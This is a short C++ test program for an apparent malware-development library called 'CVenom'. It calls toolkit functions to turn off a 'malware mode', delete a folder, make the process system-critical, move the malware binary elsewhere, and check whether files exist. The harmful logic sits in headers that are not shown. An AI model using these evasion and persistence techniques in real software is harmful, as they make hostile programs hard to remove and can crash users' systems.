#include "../CVenom.h"
#include "../RuntimeTools.h"
#include "../EvasionTools.h"
#include "../DataTools.h"


using std::cout;


EvasionTools 	Evador;
DataTools	Disk;
RuntimeTools	Runner;


int main(int argc, char** argv){
	cvinit(argc, argv);

	SetMalwareMode(OFF);

	Disk.FolderDelete("5ara");

	cvexit(0x00);
	Runner.CriticalProcess();

	cout << Runner.Pwd() << std::endl;

	Evador.MoveMalware("moved/asd.exe");


	if (Disk.FileExists("getpid.cpp")){
		printf ("getpid ayre exists\n");
	}
	if (Disk.FileExists("zabra")){
		printf("zabra Exists\n");
	}

	Runner.Wait(1000);
	cvexit(0x00);
}
